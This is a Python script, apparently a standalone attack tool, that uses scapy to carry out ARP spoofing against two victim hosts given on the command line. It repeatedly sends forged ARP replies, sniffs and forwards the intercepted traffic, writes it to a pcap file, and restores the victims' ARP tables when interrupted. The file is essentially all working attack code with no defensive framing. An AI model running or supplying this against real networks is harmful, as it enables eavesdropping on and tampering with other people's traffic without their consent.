# Packages
import scapy.all as scapy
import sys, time, multiprocessing

# Constants
DIVIDER = '=' * 60
POISON_BREAK = 30
STOP_MESSAGE = 'Press [CTRL-C] to\n1. Stop the ARP MITM Spoofing\n2. Save the sniffed packets to sniffedPackets.pcap\n3. Clean the ARP tables of the victims'

# ARP Man in the Middle Spoofing Attack
class ARPMITMSpoofing():
    # Constructs the ARP Man in the Middle Spoofing Attack
    def __init__(self, victimOneIP, victimTwoIP, interface):
        # Assign targets
        self.victimOneIP = victimOneIP
        self.victimTwoIP = victimTwoIP
        self.interface = interface

        # Assign default scapy interface
        scapy.conf.iface = interface

        # Assign macAddresses
        self.victimOneMac = scapy.getmacbyip(victimOneIP)
        self.victimTwoMac = scapy.getmacbyip(victimTwoIP)
        self.deviceMac = scapy.get_if_hwaddr(interface)

    # Returns interactive prompt string
    def __repr__(self):
        return 'ARPMITMSpoofing({}, {}, {})'.format(self.victimOneIP, self.victimTwoIP, self.interface)

    # Returns string representation
    def __str__(self):
        return 'ARP MITM Spoofing on {}:\n - Victim One IP {} at {}\n - Victim Two IP {} at {}'.format(
                self.interface, self.victimOneIP, self.victimOneMac, self.victimTwoIP, self.victimTwoMac)

    # Print Initialization Message
    def printInitializationMessage(self):
        print('{}\nRunning {}'.format(DIVIDER, self))
        print('{}\n{}'.format(DIVIDER, STOP_MESSAGE))
        print('{}\nSniffed Packets:'.format(DIVIDER))

    # Execute the attack
    def execute(self):
        # Print initialization message
        self.printInitializationMessage()

        # Setup packets
        # ARP Poisoning packet for victim one
        victimOnePoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                           psrc = self.victimTwoIP,
                           pdst = self.victimOneIP, 
                           hwdst = self.victimOneMac)

        # ARP Poisoning packet for victim two
        victimTwoPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                            psrc = self.victimOneIP,
                            pdst = self.victimTwoIP,
                            hwdst = self.victimTwoMac)

        # Sniffing process
        sniffingIncomingPacketsProcess = multiprocessing.Process(target = self.sniffIncomingPackets)

        # Start sniffing process
        sniffingIncomingPacketsProcess.start()

        # Infinitely poisons the victim and the spoofed device
        while True:
            try: # Send poison packets
                scapy.send(victimOnePoisonPacket)
                scapy.send(victimTwoPoisonPacket)
                time.sleep(POISON_BREAK)
            except KeyboardInterrupt: # CTRL-C was pressed
                sniffingIncomingPacketsProcess.join() # Wait for the packet sniffing to stop
                self.clean() # Cleaning ARP tables of the victims
                break # Stop the poisoning-loop

    # Sniffs incoming packets
    def sniffIncomingPackets(self):
        bpfFilter = 'ip host {} || ip host {} '.format(victimOneIP, victimTwoIP) 
        incomingPackets = scapy.sniff(filter = bpfFilter, prn = self.processPacket) # Sniff packets until key interrupt

        scapy.wrpcap('sniffedPackets.pcap', incomingPackets) # Save sniffed packets

    def processPacket(self, packet):
        packet.show() # lambda x: x.summary()
        scapy.sendp(packet)

    # Clean ARP tables of the victims
    def clean(self):
        # Clean victim one's ARP Table
        scapy.send(scapy.ARP(
            op=2,
            psrc=self.victimTwoIP,
            hwsrc=self.victimTwoMac,
            pdst=self.victimOneIP,
            hwdst="ff:ff:ff:ff:ff:ff"), count=5)
        # Clean victim two's ARP Table
        scapy.send(scapy.ARP(
            op=2,
            psrc=self.victimOneIP,
            hwsrc=self.victimOneMac,
            pdst=self.victimTwoIP,
            hwdst="ff:ff:ff:ff:ff:ff"), count=5)

# Starts the program
if __name__ == '__main__':
    # Disables verbosity (command line) mode
    scapy.conf.verb = 0

    # Assign parameters to variables
    victimOneIP = sys.argv[1]
    victimTwoIP = sys.argv[2]
    interface = sys.argv[3]

    # Initialize Attack
    attack = ARPMITMSpoofing(victimOneIP, victimTwoIP, interface)

    # Execute attack
    attack.execute()
